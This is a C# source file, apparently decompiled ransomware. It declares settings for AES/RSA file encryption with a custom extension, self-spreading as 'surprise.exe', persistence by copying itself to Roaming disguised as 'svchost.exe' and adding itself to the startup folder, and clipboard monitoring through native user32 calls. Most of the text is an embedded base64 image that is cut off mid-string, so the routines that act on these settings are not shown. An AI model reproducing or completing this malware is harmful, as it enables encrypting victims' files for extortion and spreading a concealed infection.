using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQEAeAB4AAD/4QAiRXhpZgAATU0AKgAAAAgAAQESAAMAAAABAAEAAAAAAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAKwBKkDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD8At3saXdweOtR0UAO2U2iigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACil2mjYaAFCZFPhg86QLuRfdjgVa0LRZ/EGq29nbpvmuHCAenPevtf9nH/gjNrXxLgsb/xBrlvY2d3ghLbO4DrySP5UAfEkulv5gWMpP/1yO6rdt4L1O7XMVjdSD1CHFfrp4M/4I4eA/htcGRVu9XfoJJHLAn64rsU/Y4i8Npi38MiaJeBuiVuPypXRLl2Pxs074Pa/qTAR2LjP97it7TP2XPF+sTBLfT9xPcnAr9ZLz4EWls+1vDaRFf8Ap2/+tWrof7Nb6xZs8No1l/dIjxRdCuz8rJf2A/iJFYfaDY2fl4znz+f5Vwfiz4F+JvBbYvdLuOpG6JS6j8hX6veMvgXqTb4RdSxKMqdm4fyri4/2T7u/LbJvtAbp5gZufxpcyByZ+Vt1ps9mwWaGSE/7alf51AylDiv038X/ALKMtraPDqXh+G4tD1ljttx/OvKPG/7AHhPxrF9n8NveabrXeIvujJ91xmjmQ1LufD3SivcPih+wH8RvhpdbG0SXUosFlktFLcDuRXjupaNcaReNb3lvPbXCHa0UiFWB/GqTKKNFP2fT86TZ/s/rQA2inbP9n9aTYaAEoo6UUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFOVd5AHU0ANopxjK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RMjXDyNcTK68qNxFee+P57zxXug1SAXdoPlAuB5q4+hzXtXivwUfPklJGF6DvXmnimxmvUa3EQAU9c00yHZ7HxT8c/8Agmjo/wATtV1DUtKurfRbnaXSNIwkTn0CgYAr4o+Kv7Nvi74TX8kepaTcG3jJ23MaExuAevtX7IHSY4rVzPlfLHBryD4vaRP49gOmT26y6bJkSM4DYHp6/lRzMiLaPyOOcH/OKZ83vX13+0L+wRGL0XPgiN3LDMls7fKW9s18u+LPBmo+B9am0/VbWW0vITtaNx3+tPmK5jFPWip2hA4OcionwDxVFDaKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAAyadt/ziiFSzcAnjtXsn7D37Ms37WX7RXh/wWi3Hk6lOscrwpkKCccntQBz/wCz3+y/41/ah8WQ6L4K0W71i+ZgrbFwsf1NfvN/wSF/4Nt9H8J+EY/E3xPhWHxAgEgjkjX92OpHrX3Z/wAE0f8AgkJ8Pv8AgmNoP22zgtbq9kth51y8e+RHIyeSOfrWp+15+0hrl7qBsPDxksoZEZQ+cGT3x2pS2A9SmvPg78EPh3a6PqFxpcdppqBAoOG4+leCfGb/AIKdfA34PwSLpNnaXU75CNgsSfUcnFfFHxg+DXjjxnfTXmqeIpobSRixEk2BivnL4peBNA+Hz3El3qZv5gCG8tg+DUPXcTdj6c+L3/BRj4jfE7xKf+EXm/s/wzO+XHmAfL+Iryj4lfEfTYNLuLjVddtDNN8zKJVZifTrX59/HT9snVfB6T6dpGpzW1nE3Chtrn/61fL/AI2+PXiLxheSPNql26zZ4808UJEuXY+1v2k/21fD3g+Wa0s9k0ozlVYkuff0r4n+LPxrvPibqbTtClvCWyqqxJ/nXF3F01w5aRmd2OSzNkmoapRe49GP8/BJ+bJpGcEd/wAqj/76o/76qh8qBzx3pu6nMcjvTaBh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